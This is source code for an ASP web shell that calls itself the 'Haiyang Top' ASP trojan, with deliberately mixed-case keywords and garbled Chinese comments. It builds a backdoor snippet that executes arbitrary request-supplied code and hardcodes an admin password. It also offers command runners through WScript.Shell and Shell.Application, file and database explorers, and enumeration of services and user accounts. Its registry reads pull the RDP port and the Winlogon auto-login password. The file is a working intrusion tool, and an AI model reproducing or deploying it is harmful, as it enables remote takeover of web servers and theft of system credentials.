   <obje_Litect rUnAt="server" ID="ws" scopE="page" CLAsSiD="clsid:72C24DD5-D70A-438B-8A42-98424B88AFB8"></oBJect>
   <objEct ruNat="server" ID="Ws" scoPE="page" clAsSid="clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B"></OBjECt>
   <oBjecT ruNaT="server" Id="fso" scOpE="page" CLASsid="clsid:0D43FE01-F093-11CF-8940-00A0C9054228"></oBjECt>
   <obJECt ruNat="server" iD="sa" SCope="page" CLasSID="clsid:13709620-C279-11CE-A49E-444553540000"></objeCT>
   <%
   '   OptIon EXpLiciT
       dIM theAct, sTime, aspPath, pageName, strBackDoor, fsoX, saX, wsX
       sTime = Timer
       theAct= rEqUest("theAct")
       pageName = rEQueSt("pageName")
       aspPath = Replace(Server.MappaTH(".") & "\~86.tmp", "\\", "\") ''ÏµÍ³ÁÙÊ±ÎÄ¼þ
       strBackDoor = "<script lAngUAGE=vBSCrIPT RUnat=server>"
       strBackDoor = strBackDoor & "If REQUESt(""" & clientPassword & """)<>"""" TheN seSsION(""#"")=reQuEst(""" & clientPassword & """)" & VbNewLine
       strBackDoor = strBackDoor & "If sESSIOn(""#"")<>"""" THen Execute(SeSSiOn(""#""))"
       strBackDoor = strBackDoor & "</script>"                         ''²åÈëµÄºóÃÅ´úÂë

       CoNst m = "HYTop2006"                   ''×Ô¶¨ÒåSEsSIOnÇ°×º
       COnST showLogin = ""                    ''Îª¿ÕÖ±½ÓÏÔÊ¾µÇÂ¼½çÃæ,·ñÔòÓÃ"?pageName=ËüµÄÖµ"À´½øÐÐ·ÃÎÊ
       ConST clientPassword = "#"              ''²åÈëºóÃÅµÄÃÜÂë,Èç¹ûÒª²åÈëÊý¾Ý¿âÖÐ,Ö»ÄÜÎªÒ»¸ö×Ö·û.
       cONst dbSelectNumber = 10               ''Êý¾Ý¿â²Ù×÷Ê±Ä¬ÈÏ´Ó±íÖÐÑ¡È¡µÄÊý¾ÝÁ¿
       cOnst isDebugMode = False               ''ÊÇ·ñµ÷ÊÔÄ£Ê½
       cOnSt myName = "Ö¥Âé¿ªÃÅ,Å¼ÊÇÀÏÂí"          ''µÇÂ¼Ò³°´Å¤ÉÏµÄÎÄ×Ö
       CONSt notdownloadsExists = False        ''ÔACCESSÊý¾Ý¿âÖÐÊÇ·ñ´æÔÚnotdownloadsExists±í
       CoNST userPassword = "22066260"     ''¹ÜÀíÃÜÂë
       cONST myCmdDotExeFile = "command.com"   ''¶¨Òåcmd.exeÎÄ¼þµÄÎÄ¼þÃû
       coNst strJsCloseMe = "<inpUT TYPE=Button VaLUe=' ¹Ø±Õ ' ONCliCK='window.close();'>"
       SuB createIt(fsoX, saX, wsX)
           If isDebugMode = False THEn
               On Error Resume Next
           eNd If
           Set fsoX = Server.CreATeobJeCT("Scripting.FileSystemObject")
           If IsEmpty(fsoX) and (pageName = "FsoFileExplorer" OR theAct = "fsoSearch") tHeN
               Set fsoX = fso
           end If
           Set saX = Server.cReAtEOBJEct("Shell.Application")
           If IsEmpty(saX) AnD (pageName = "AppFileExplorer" oR pageName = "SaCmdRun" Or theAct = "saSearch") theN
               Set saX = sa
           ENd If
           Set wsX = Server.CrEATeobjeCT("WScript.Shell")
           If IsEmpty(wsX) aND (pageName = "WsCmdRun" or theAct = "getTerminalInfo" or theAct = "readReg") THEn
               Set wsX = WS
           End If
           If Err TheN
               Err.cLEaR
           eND If
       End SUb
       SUB chkErr(Err)
           If Err TheN
               ECHO "<style>BoDy{margin:8;border:none;overflow:hIDDEn;background-color:buttonface;}</style>"
               echo "<Br/><font size=2><li>´íÎó: " & Err.DeSCrIPTIoN & "</li><li>´íÎóÔ´: " & Err.Source & "</li><Br/>"
               ECHO "<hr>Powered By Marcos 2005.02</font>"
               Err.cleAR
               RespoNsE.END
           end If
       eNd SuB

       suB EcHO(str)
           rEsPONsE.wRITe(str)
       eNd sUB

       Sub isIN()
           If pageName <> "" anD PageName <> "login" AND PageName <> showLogin THeN
               If SESSion(m & "userPassword") <> userPassword tHen
                   reSPOnSE.end
               EnD If
           END If
       EnD Sub

       SUB showTitLe(str)
           ecHo "<TItLE>" & str & " - º£Ñô¶¥¶ËÍøASPÄ¾Âí2006 - By Marcos & LCX</tITLE>" & vbNewLine
           ecHo "<Meta http-equiv='Content-tyPE' content='text/html; charset=gb2312'>" & vbNewLine
           ECHO "<!--" & vbNewLine
           echO "=ÖÔÐÄ¸ÐÐ»=====================================================" & vbNewLine
           EcHo "Íø³½ÔÚÏß¡¢»¯¾³±à³Ì¡¢¹ðÁÖÀÏ±ø¡¢±ùºüÀË×Ó¡¢À¶ÆÁ¡¢Ð¡Â·¡¢wangyong¡¢" & vbNewLine
           echo "czy¡¢allen¡¢lcx¡¢Marcos¡¢kEvin1986¡¢myth¶Ôº£Ñô¶¥¶ËÍøaspÄ¾ÂíËù" & vbNewLine
           eCho "×öµÄÒ»ÇÐÅ¬Á¦£¡" & vbNewLine
           Echo "==============================================================" & vbNewLine & vbNewLine
           EchO "=±¾°æ¹ØÓÚ=====================================================" & vbNewLine
           EcHO "³ÌÐò±àÐ´: Marcos" & vbNewLine
           eChO "ÁªÏµ·½Ê½: QQ26696782" & vbNewLine
           EcHO "·¢²¼Ê±¼ä: 2005.02.28" & vbNewLine
           ecHo "³ö Æ· ÈË: Allen, lcx, Marcos" & vbNewLine
           EcHo "¹Ù·½·¢²¼: WWW.HIDIDI.nET(2) WWW.HAIYANGTOP.NeT(1)" & vbNewLine
           EcHO "==============================================================" & vbNewLine
           eCho "-->" & vbNewLine
           pagEOTher()
       eNd SUB

       Function fixNull(str)
           If IsNull(str) theN
               str = " "
           eND If
           fixNull = str
       eND Function

       Function encode(str)
           str = Server.HTMLEncode(str)
           str = Replace(str, vbNewLine, "<bR>")
           str = Replace(str, " ", "&nbsp;")
           str = Replace(str, "    ", "&nbsp;&nbsp;&nbsp;&nbsp;")
           encode = str
       ENd Function

       Function getTheSize(theSize)
           If theSize >= (1024 * 1024 * 1024) THEn getTheSize = Fix((theSize / (1024 * 1024 * 1024)) * 100) / 100 & "G"
           If theSize >= (1024 * 1024) anD theSize < (1024 * 1024 * 1024) theN getTheSize = Fix((theSize / (1024 * 1024)) * 100) / 100 & "M"
           If theSize >= 1024 anD theSize < (1024 * 1024) tHen getTheSize = Fix((theSize / 1024) * 100) / 100 & "K"
           If theSize >= 0 And theSize <1024 tHen getTheSize = theSize & "B"
       ENd Function

       Function HtmlEncode(str)
           If isNull(str) THeN
               Exit Function
           END If
           HtmlEncode = Server.HTMLEncode(str)
       END Function

       Function UrlEncode(str)
           If isNull(str) tHeN
               Exit Function
           end If
           UrlEncode = Server.UrlEncode(str)
       END Function

       sUb rEDIrectTO(strUrl)
           rESPOnse.Redirect(rEqUEst.sERveRVAriaBleS("URL") & strUrl)
       ENd SUb
       Function trimThePath(strPath)
           If RighT(strPath, 1) = "\" aND Len(strPath) > 3 thEN
               strPath = LEfT(strPath, Len(strPath) - 1)
           ENd If
           trimThePath = strPath
       end Function
       sUb alertThenClose(strInfo)
           RespOnSE.wrIte "<script>alert(""" & strInfo & """);window.close();</script>"
       end suB
       sUB showErr(str)
           dim i, arrayStr
           str = Server.HtmlEncode(str)
           arrayStr = sPLIT(str, "$$")
   '       reSpoNse.clEAR
           eChO "<font size=2>"
           EchO "³ö´íÐÅÏ¢:<bR/><Br/>"
           For i = 0 To UbOUND(arrayStr)
               ECHO "&nbsp;&nbsp;" & (i + 1) & ". " & arrayStr(i) & "<bR/>"
           Next
           EcHo "</font>"
           resPonse.End
       enD SUB
       ReM =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
       REM     ÏÂÃæÊÇ³ÌÐòÄ£¿éÑ¡Ôñ²¿·Ö
       rEM =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
       isin()

       Call createIt(fsoX, saX, wsX)
       SeLECT Case pageName
           Case showLogin, "login"
               PaGElOgIn()
           Case "PageList"
               PageList()
           Case "objOnSrv"
               PageObjOnSrv()
           Case "ServiceList"
               PageServiceList()
           Case "userList"
               PageUserList()
           Case "CSInfo"
               PageCSInfo()
           Case "infoAboutSrv"
               PageInfoAboutSrv()
           Case "AppFileExplorer"
               PageAppFileExplorer()
           Case "SaCmdRun"
               PageSaCmdRun()
           Case "WsCmdRun"
               PageWsCmdRun()
           Case "FsoFileExplorer"
               PageFsoFileExplorer()
           Case "MsDataBase"
               PageMsDataBase()
           Case "OtherTools"
               PageOtherTools()
           Case "TxtSearcher"
               PageTxtSearcher()
           Case "PageAddToMdb"
               PageAddToMdb()
       END selECt

       Set saX = Nothing
       Set wsX = Nothing
       Set fsoX = Nothing
       Rem =-=-=-=-=-=-=-=-=-=-=-=-=-=-=
       Rem     ÏÂÃæÊÇ¸÷¶ÀÁ¢¹¦ÄÜÄ£¿é
       REm =-=-=-=-=-=-=-=-=-=-=-=-=-=-=
       SUB PageList()
           SHowTItle("¹¦ÄÜÄ£¿éÁÐ±í")
           Echo "<base target=_blank>º£Ñô¶¥¶ËÍøASPÄ¾Âí@2006¦Á<hr/><ol>"
           EChO "<li><a href='?pageName=ServiceList'>ÏµÍ³·þÎñÐÅÏ¢</a></li><br/>"
           ECHO "<li><a href='?pageName=infoAboutSrv'>·þÎñÆ÷Ïà¹ØÊý¾Ý</a><br/>"
           EChO "(<a href='?pageName=infoAboutSrv&theAct=getSrvInfo'>ÏµÍ³²ÎÊý</a>,"
           ECHo "<a href='?pageName=infoAboutSrv&theAct=getSrvDrvInfo'>ÏµÍ³´ÅÅÌ</a>,"
           EcHo "<a href='?pageName=infoAboutSrv&theAct=getSiteRootInfo'>Õ¾µãÎÄ¼þ¼Ð</a>,"
           ECHo "<a href='?pageName=infoAboutSrv&theAct=getTerminalInfo'>ÖÕ¶Ë¶Ë¿Ú&×Ô¶¯µÇÂ¼)</a></li><bR/>"
           ECho "<li><a href='?pageName=objOnSrv'>·þÎñÆ÷×é¼þÌ½Õë</a></li><Br/>"
           EcHO "<li><a href='?pageName=userList'>ÏµÍ³ÓÃ»§¼°ÓÃ»§×éÐÅÏ¢</a></li><bR/>"
           EcHO "<li><a href='?pageName=CSInfo'>¿Í»§¶Ë·þÎñÆ÷½»»¥ÐÅÏ¢</a></li><bR/>"
           eCHO "<li><a href='?pageName=WsCmdRun'>WScript.Shell³ÌÐòÔËÐÐÆ÷cmd.asp</a></li><Br/>"
           EChO "<li><a href='?pageName=SaCmdRun'>Shell.Application³ÌÐòÔËÐÐÆ÷</a></li><br/>"
           eCHo "<li><a href='?pageName=FsoFileExplorer'>FSOÎÄ¼þä¯ÀÀ²Ù×÷Æ÷</a></li><bR/>"
           ecHO "<li><a href='?pageName=AppFileExplorer'>Shell.ApplicationÎÄ¼þä¯ÀÀ²Ù×÷Æ÷</a></li><bR/>"
           EChO "<li><a href='?pageName=MsDataBase'>Î¢ÈíÊý¾Ý¿â²é¿´/²Ù×÷Æ÷</a></li><BR/>"
           ECho "<li><a href='?pageName=TxtSearcher'>ÎÄ±¾ÎÄ¼þËÑË÷Æ÷</a></li><br/>"
           echo "<li><a href='?pageName=OtherTools'>Ò»Ð©ÁãËéµÄÐ¡¶«Î÷</a></li><BR/>"
           EcHo "<li><a href='?pageName=PageAddToMdb'>ÎÄ¼þ¼Ð´ò°ü/½â¿ªÆ÷</a></li><bR/>"
           ECHo "</ol><hr/>Powered By Marcos 2005.02"
       end sUb
       Sub PageServiceList()
           dIm sa, objService, objComputer

           ShoWtitlE("ÏµÍ³·þÎñÐÅÏ¢²é¿´")
           Set objComputer = GetObject("WinNT://.")
           Set sa = Server.CreaTEOBjEct("Shell.Application")
           objComputer.Filter = Array("Service")

           ECho "<ol>"
           If isDebugMode = False then
               On Error Resume Next
           END If
           For eaCH objService In objComputer
               ECHO "<li>" & objService.namE & "</li><hr/>"
               EcHo "<ol>·þÎñÃû³Æ: " & objService.name & "<bR/>"
               ECHo "ÏÔÊ¾Ãû³Æ: " & objService.DisplayName & "<br/>"
               EchO "Æô¶¯ÀàÐÍ: " & getStartType(objService.StartType) & "<Br/>"
               ecHo "ÔËÐÐ×´Ì¬: " & sa.IsServiceRunning(objService.nAme) & "<Br/>"
   '           ecHo "µ±Ç°×´Ì¬: " & objService.Status & "<Br/>"
   '           EcHO "·þÎñÀàÐÍ: " & objService.ServiceType & "<BR/>"
               eCHO "µÇÂ¼Éí·Ý: " & objService.ServiceAccountName & "<br/>"
               eCho "·þÎñÃèÊö: " & getServiceDsc(objService.namE) & "<bR/>"
               eCho "ÎÄ¼þÂ·¾¶¼°²ÎÊý: " & objService.Path
               echo "</ol><hr/>"
           Next
           eCHO "</ol><hr/>Powered By Marcos 2005.02"

           Set sa = Nothing
       END Sub
       Function getServiceDsc(strService)
           Dim WS
           Set WS = Server.CrEatEOBjeCT("WScript.Shell")
           getServiceDsc = wS.RegRead("HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\" & strService & "\DescrIpTION")
           Set ws = Nothing
       ENd Function
       Function getStartType(num)
           seleCt Case num
               Case 2
                   getStartType = "×Ô¶¯"
               Case 3
                   getStartType = "ÊÖ¶¯"
               Case 4
                   getStartType = "ÒÑ½ûÓÃ"
           ENd SELeCt
       ENd Function
       suB PageInfoAboutSrv()
           DiM theAct
           theAct = reQuEst("theAct")

           sHowTITLe("·þÎñÆ÷Ïà¹ØÊý¾Ý")

           sELeCt Case theAct
               Case ""
                   getSrvInfo()
                   getSrvDrvInfo()
                   getSiteRootInfo()
                   getTerminalInfo()
               Case "getSrvInfo"
                   getSrvInfo()
               Case "getSrvDrvInfo"
                   getSrvDrvInfo()
               Case "getSiteRootInfo"
                   getSiteRootInfo()
               Case "getTerminalInfo"
                   getTerminalInfo()
           ENd sELeCT

           eCHO "<hr/>Powered By Marcos 2005.02"
       end sUb
       SUb getSrvInfo()
           If isDebugMode = False tHen
               On Error Resume Next
           enD If
           DiM i, sa, objWshSysEnv, aryExEnvList, strExEnvList, intCpuNum, strCpuInfo, strOS
           Set sa = Server.CReAtEOBjECt("Shell.Application")
           strExEnvList = "SystemRoot$WinDir$ComSpec$TEMP$TMP$NUMBER_OF_PROCESSORS$OS$Os2LibPath$Path$PATHEXT$PROCESSOR_ARCHITECTURE$" & _
                          "PROCESSOR_IDENTIFIER$PROCESSOR_LEVEL$PROCESSOR_REVISION"
           aryExEnvList = spLIT(strExEnvList, "$")

           Set objWshSysEnv = wsX.Environment("SYSTEM")
           chkErr(Err)
           intCpuNum = REQUest.sErvervARiaBLes("NUMBER_OF_PROCESSORS")
           If IsNull(intCpuNum) Or intCpuNum = "" tHEn
               intCpuNum = objWshSysEnv("NUMBER_OF_PROCESSORS")
           End If
           strOS = REQUeST.SERVervARIableS("OS")
           If IsNull(strOS) oR strOS = "" THen
               strOS = objWshSysEnv("OS")
               strOs = strOs & "(ÓÐ¿ÉÄÜÊÇ Windows2003 Å¶)"
           eNd If
           strCpuInfo = objWshSysEnv("PROCESSOR_IDENTIFIER")
           ECho "<a href=javascript:showHideMe(srvInf);>·þÎñÆ÷Ïà¹Ø²ÎÊý:</a>"
           eCHO "<ol iD=srvInf><hr/>"
           EchO "<li>·þÎñÆ÷Ãû: " & REquest.sERVervAriaBlES("SERVER_NamE") & "</li>"
           echo "<li>·þÎñÆ÷IP: " & reQUeST.sERvervARIaBLES("LOCAL_ADDR") & "</li>"
           eChO "<li>·þÎñ¶Ë¿Ú: " & rEquEST.sERvErVarIabLEs("SERVER_PORT") & "</li>"
           EcHo "<li>·þÎñÆ÷ÄÚ´æ: " & getTheSize(sa.GetSystemInformation("PhysicalMemoryInstalled")) & "</li>"
           ECHO "<li>·þÎñÆ÷Ê±¼ä: " & Now & "</li>"
           EcHo "<li>·þÎñÆ÷Èí¼þ: " & rEQUEST.SeRVERvARiaBlES("SERVER_SOFTWARE") & "</li>"
           eChO "<li>½Å±¾³¬Ê±Ê±¼ä: " & Server.ScriptTimeout & "</li>"
           ecHo "<li>·þÎñÆ÷CPUÊýÁ¿: " & intCpuNum & "</li>"
           ecHO "<li>·þÎñÆ÷CPUÏêÇé: " & strCpuInfo & "</li>"
           eChO "<li>·þÎñÆ÷²Ù×÷ÏµÍ³: " & strOS & "</li>"
           eChO "<li>·þÎñÆ÷½âÒëÒýÇæ: " & ScriptEngine & "/" & ScriptEngineMajorVersion & "." & ScriptEngineMinorVersion & "." & ScriptEngineBuildVersion & "</li>"
           ECHo "<li>±¾ÎÄ¼þÊµ¼ÊÂ·¾¶: " & REqUEst.SERvErVaRIABLES("PATH_TRANSLATED") & "</li>"
           ecHo "<hr/></ol>"

           ecHo "<br/><a href=javascript:showHideMe(srvEnvInf);>·þÎñÆ÷Ïà¹Ø²ÎÊý:</a>"
           eCHO "<ol id=srvEnvInf><hr/>"
           For i = 0 To UboUnd(aryExEnvList)
               Echo "<li>" & aryExEnvList(i) & ": " & wsX.ExpandEnvironmentStrings("%" & aryExEnvList(i) & "%") & "</li>"
           Next
           eChO "<hr/></ol>"

           Set sa = Nothing
           Set objWshSysEnv = Nothing
       enD SUB
       sUb getSrvDrvInfo()
           If isDebugMode = False TheN
               On Error Resume Next
           End If
           DIm objTheDrive
           eCHo "<Br/><a href=javascript:showHideMe(srvDriveInf);>·þÎñÆ÷´ÅÅÌÐÅÏ¢:</a>"
           Echo "<ol ID=srvDriveInf><hr/>"
           Echo "<div ID='fsoDriveList'>"
           eCHo "<span>ÅÌ·û</span><span>ÀàÐÍ</span><span>¾í±ê</span><span>ÎÄ¼þÏµÍ³</span><span>¿ÉÓÃ¿Õ¼ä</span><span>×Ü¿Õ¼ä</span><BR/>"
           For eACh objTheDrive In fsoX.Drives
               echO "<span>" & objTheDrive.DriveLetter & "</span>"
               eChO "<span>" & getDriveType(objTheDrive.DriveType) & "</span>"
               If ucASE(objTheDrive.DriveLetter) = "A" THEn
                   EchO "<BR/>"
                Else
                   ECHO "<span>" & objTheDrive.VolumeName & "</span>"
                   ECho "<span>" & objTheDrive.FileSystem & "</span>"
                   ecHO "<span>" & getTheSize(objTheDrive.FreeSpace) & "</span>"
                   Echo "<span>" & getTheSize(objTheDrive.TotalSize) & "</span><BR/>"
               eNd If
               If Err THen
                   Err.ClEAR
                   echo "<Br/>"
               enD If
           Next
           echo "</div><hr/></ol>"
           Set objTheDrive = Nothing
       enD SUB
       sub getSiteRootInfo()
           If isDebugMode = False then
               On Error Resume Next
           END If
           dIM objTheFolder
           Set objTheFolder = fsoX.GetFolder(Server.maPPATh("/"))
           eCHo "<Br/><a href=javascript:showHideMe(siteRootInfo);>Õ¾µã¸ùÄ¿Â¼ÐÅÏ¢:</a>"
           echO "<ol ID=siteRootInfo><hr/>"
           echO "<li>ÎïÀíÂ·¾¶: " & Server.mAppAth("/") & "</li>"
           EchO "<li>µ±Ç°´óÐ¡: " & getTheSize(objTheFolder.Size) & "</li>"
           ECho "<li>ÎÄ¼þÊý: " & objTheFolder.Files.Count & "</li>"
           EchO "<li>ÎÄ¼þ¼ÐÊý: " & objTheFolder.SubFolders.Count & "</li>"
           ECho "<li>´´½¨ÈÕÆÚ: " & objTheFolder.DateCreated & "</li>"
           Echo "<li>×îºó·ÃÎÊÈÕÆÚ: " & objTheFolder.DateLastAccessed & "</li>"
           EChO "</ol>"
       EnD sUB
       sUb getTerminalInfo()
           If isDebugMode = False tHeN
               On Error Resume Next
           EnD If
           dim terminalPortPath, terminalPortKey, termPort
           dIM autoLoginPath, autoLoginUserKey, autoLoginPassKey
           DiM isAutoLoginEnable, autoLoginEnableKey, autoLoginUsername, autoLoginPassword
           terminalPortPath = "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\"
           terminalPortKey = "PortNumber"
           termPort = wsX.RegRead(terminalPortPath & terminalPortKey)
           ECHo "ÖÕ¶Ë·þÎñ¶Ë¿Ú¼°×Ô¶¯µÇÂ¼ÐÅÏ¢<hr/><ol>"
           If termPort = "" or Err.Number <> 0 thEn
               EcHo  "ÎÞ·¨µÃµ½ÖÕ¶Ë·þÎñ¶Ë¿Ú, Çë¼ì²éÈ¨ÏÞÊÇ·ñÒÑ¾ÊÜµ½ÏÞÖÆ.<BR/>"
            Else
               ECHo  "µ±Ç°ÖÕ¶Ë·þÎñ¶Ë¿Ú: " & termPort & "<br/>"
           EnD If

           autoLoginPath = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\"
           autoLoginEnableKey = "AutoAdminLogon"
           autoLoginUserKey = "DefaultUserName"
           autoLoginPassKey = "DefaultPassword"
           isAutoLoginEnable = wsX.RegRead(autoLoginPath & autoLoginEnableKey)
           If isAutoLoginEnable = 0 tHEN
               echO  "ÏµÍ³×Ô¶¯µÇÂ¼¹¦ÄÜÎ´¿ªÆô<br/>"
           Else
               autoLoginUsername = wsX.RegRead(autoLoginPath & autoLoginUserKey)
               ECHo  "×Ô¶¯µÇÂ¼µÄÏµÍ³ÕÊ»§: " & autoLoginUsername & "<Br>"
               autoLoginPassword = wsX.RegRead(autoLoginPath & autoLoginPassKey)
               If Err tHeN
                   Err.clEAR
                   echO  "False"
               End If
               Echo  "×Ô¶¯µÇÂ¼µÄÕÊ»§ÃÜÂë: " & autoLoginPassword & "<BR>"
           EnD If
           echo "</ol>"
       End sUB
       Function getDriveType(num)
           SeleCT Case num
               Case 0
                   getDriveType = "Î´Öª"
               Case 1
                   getDriveType = "¿ÉÒÆ¶¯´ÅÅÌ"
               Case 2
                   getDriveType = "±¾µØÓ²ÅÌ"
               Case 3
                   getDriveType = "ÍøÂç´ÅÅÌ"
               Case 4
                   getDriveType = "CD-ROM"
               Case 5
                   getDriveType = "RAM ´ÅÅÌ"
           eND SelECt
       ENd Function
       Sub PageObjOnSrv()
           dIM i, objTmp, txtObjInfo, strObjectList, strDscList
           txtObjInfo = Trim(reQUEst("txtObjInfo"))
           strObjectList = "MSWC.AdRotator,MSWC.BrowserType,MSWC.NextLink,MSWC.Tools,MSWC.Status,MSWC.Counters,IISSample.ContentRotator," & _
                           "IISSample.PageCounter,MSWC.PermissionChecker,aDOdB.Connection,SoftArtisans.FileUp,SoftArtisans.FileManager,LyfUpload.UploadFile," & _
                           "Persits.Upload.1,W3.Upload,JMail.SmtpMail,CDONTS.NewMail,Persits.MailSender,SMTPsvg.Mailer,DkQmail.Qmail,Geocel.Mailer," & _
                           "IISmail.Iismail.1,SmtpMail.SmtpMail.1,SoftArtisans.ImageGen,W3Image.Image," & _
                           "Scripting.FileSystemObject,aDoDb.Stream,Shell.Application,WScript.Shell,Wscript.Network"
           strDscList = "¹ã¸æÂÖ»»,ä¯ÀÀÆ÷ÐÅÏ¢,ÄÚÈÝÁ´½Ó¿â,,,¼ÆÊýÆ÷,ÄÚÈÝÂÖÏÔ,,È¨ÏÞ¼ì²â,ADO Êý¾Ý¶ÔÏó,SA-FileUp ÎÄ¼þÉÏ´«,SoftArtisans ÎÄ¼þ¹ÜÀí," & _
                        "ÁõÔÆ·åµÄÎÄ¼þÉÏ´«×é¼þ,ASPUpload ÎÄ¼þÉÏ´«,Dimac ÎÄ¼þÉÏ´«,Dimac JMail ÓÊ¼þÊÕ·¢,ÐéÄâ SMTP ·¢ÐÅ,ASPemail ·¢ÐÅ,ASPmail ·¢ÐÅ,dkQmail ·¢ÐÅ," & _
                        "Geocel ·¢ÐÅ,IISmail ·¢ÐÅ,SmtpMail ·¢ÐÅ,SA µÄÍ¼Ïñ¶ÁÐ´,Dimac µÄÍ¼Ïñ¶ÁÐ´×é¼þ," & _
                        "FSO,Stream Á÷,,,"
           aryObjectList = spLIt(strObjectList, ",")
           aryDscList = spLIt(strDscList, ",")
           ShowTitlE("·þÎñÆ÷×é¼þÖ§³ÖÇé¿ö¼ì²â")
           ECho "ÆäËû×é¼þÖ§³ÖÇé¿ö¼ì²â<Br/>"
           ecHo "ÔÚÏÂÃæµÄÊäÈë¿òÖÐÊäÈëÄãÒª¼ì²âµÄ×é¼þµÄProgId»òcLaSSiD¡£<BR/>"
           EcHO "<foRm mEThoD=pOst>"
           ecHo "<inPUT name=txtObjInfo size=30 vAluE=""" & txtObjInfo & """><InPuT namE=theAct tYpe=submit value=ÎÒÒª¼ì²â>"
           ECHO "</forM>"
           If REqUEst("theAct") = "ÎÒÒª¼ì²â" ANd txtObjInfo <> "" THeN
               Call getObjInfo(txtObjInfo, "")
           EnD If

           eCHO "<hr/>"
           ecHO "<lu>×é¼þÃû³Æ ©ª Ö§³Ö¼°ÆäËü"
           For i = 0 To UBOunD(aryDscList)
               Call getObjInfo(aryObjectList(i), aryDscList(i))
           Next
           ECHo "</lu><hr/>Powered By Marcos 2005.02"
       End sub
       SuB getObjInfo(strObjInfo, strDscInfo)
           dim objTmp
           If isDebugMode = False THen
               On Error Resume Next
           EnD If
           echO "<li> " & strObjInfo
           If strDscInfo <> "" theN
               ecHo " (" & strDscInfo & "×é¼þ)"
           END If
           EchO " ©ª "
           Set objTmp = Server.cReateobJEct(strObjInfo)
           If Err <> -2147221005 theN
               echo "¡Ì "
               Echo "Version: " & objTmp.Version & "; "
               echO "About: " & objTmp.About
            Else
               eCho "¡Á"
           EnD If
           EcHO "</li>"
           If Err tHEn
               Err.clear
           eND If

           Set objTmp = Nothing
       End sUB
       SUb PageUserList()
           diM objUser, objGroup, objComputer

           SHOWtitlE("ÏµÍ³ÓÃ»§¼°ÓÃ»§×éÐÅÏ¢²é¿´")
           Set objComputer = GetObject("WinNT://.")
           objComputer.Filter = Array("User")
           ecHo "<a href=javascript:showHideMe(userList);>User:</a>"
           eCHO "<span Id=userList><hr/>"
           For EaCH objUser in objComputer
               ECho "<li>" & objUser.NaMe & "</li>"
               ECHO "<ol><hr/>"
               getUserInfo(objUser.name)
               eCho "<hr/></ol>"
           Next
           ecHo "</span>"

           eCHo "<Br/><a href=javascript:showHideMe(userGroupList);>UserGroup:</a>"
           ECHO "<span id=userGroupList><hr/>"
           objComputer.Filter = Array("Group")
           For EaCh objGroup in objComputer
               ECHO "<li>" & objGroup.namE & "</li>"
               eCho "<ol><hr/>" & objGroup.deSCripTiON & "<hr/></ol>"
           Next
           echo "</span><hr/>Powered By Marcos 2005.02"
       ENd Sub
       SUb getUserInfo(strUser)
           DiM User, Flags
           If isDebugMode = False thEN
               On Error Resume Next
           eND If
           Set User = GetObject("WinNT://./" & strUser & ",user")
           EChO "ÃèÊö: " & User.deScRiPTION & "<br/>"
           EchO "ËùÊôÓÃ»§×é: " & getItsGroup(strUser) & "<BR/>"
           Echo "ÃÜÂëÒÑ¹ýÆÚ: " & cbool(User.Get("PasswordExpired")) & "<bR/>"
           Flags = User.Get("UserFlags")
           eCho "ÃÜÂëÓÀ²»¹ýÆÚ: " & cbool(Flags AnD &H10000) & "<bR/>"
           echo "ÓÃ»§²»ÄÜ¸ü¸ÄÃÜÂë: " & cbool(Flags aNd &H00040) & "<BR/>"
           EcHO "·ÇÈ«¾ÖÕÊºÅ: " & cbool(Flags AnD &H100) & "<Br/>"
           EcHO "ÃÜÂëµÄ×îÐ¡³¤¶È: " & User.PasswordMinimumLength & "<Br/>"
           EcHO "ÊÇ·ñÒªÇóÓÐÃÜÂë: " & User.PasswordRequired & "<BR/>"
           echo "ÕÊºÅÍ£ÓÃÖÐ: " & User.AccountDisabled & "<Br/>"
           eCho "ÕÊºÅËø¶¨ÖÐ: " & User.IsAccountLocked & "<br/>"
           EchO "ÓÃ»§ÐÅÏ¢ÎÄ¼þ: " & User.Profile & "<bR/>"
           echo "ÓÃ»§µÇÂ¼½Å±¾: " & User.LoginScript & "<BR/>"
           ECho "ÓÃ»§HomeÄ¿Â¼: " & User.HomeDirectory & "<br/>"
           eCHo "ÓÃ»§HomeÄ¿Â¼¸ù: " & User.Get("HomeDirDrive") & "<Br/>"
           Echo "ÕÊºÅ¹ýÆÚÊ±¼ä: " & User.AccountExpirationDate & "<br/>"
           echO "ÕÊºÅÊ§°ÜµÇÂ¼´ÎÊý: " & User.BadLoginCount & "<BR/>"
           EcHO "ÕÊºÅ×îºóµÇÂ¼Ê±¼ä: " & User.LastLogin & "<br/>"
           ECHo "ÕÊºÅ×îºó×¢ÏúÊ±¼ä: " & User.LastLogoff & "<br/>"
           For eAch RegTime In User.LoginHours
               If RegTime < 255 tHEN
                   Restrict = True
               eNd If
           Next
           EchO "ÕÊºÅÒÑÓÃÊ±¼ä: " & Restrict & "<BR/>"
           Err.CLear
       enD sUB
       Function getItsGroup(strUser)
           diM objUser, objGroup
           Set objUser = GetObject("WinNT://./" & strUser & ",user")
           For each objGroup in objUser.Groups
               getItsGroup = getItsGroup & " " & objGroup.nAme
           Next
       EnD Function
       SUb PageCSInfo()
           If isDebugMode = False ThEn
               On Error Resume Next
           End If
           DIm strKey, strVar, strVariable

           SHowTitLe("¿Í»§¶Ë·þÎñÆ÷½»»¥ÐÅÏ¢")

           ecHo "<a href=javascript:showHideMe(SErvERVarIabLEs);>sErVeRVAriaBLEs:</a>"
           eChO "<span Id=SErveRvArIabLes style='display:none;'>"
           For eaCh strVariable In ReQuEst.SErvERvaRiables
               EchO "<li>" & strVariable & ": " & REquest.SERvERVaRiABLes(strVariable) & "</li>"
           Next
           ECHo "</span>"

           EcHO "<Br/><a href=javascript:showHideMe(Application);>Application:</a>"
           Echo "<span Id=Application style='display:none;'>"
           For eAch strVariable In Application.Contents
               ecHo "<li>" & strVariable & ": " & Encode(Application(strVariable)) & "</li>"
               If Err tHEn
                   For EAcH strVar In Application.Contents(strVariable)
                       ECHo "<li>" & strVariable & "(" & strVar & "): " & Encode(Application(strVariable)(strVar)) & "</li>"
                   Next
                   Err.CLeAR
               End If
           Next
           eCho "</span>"
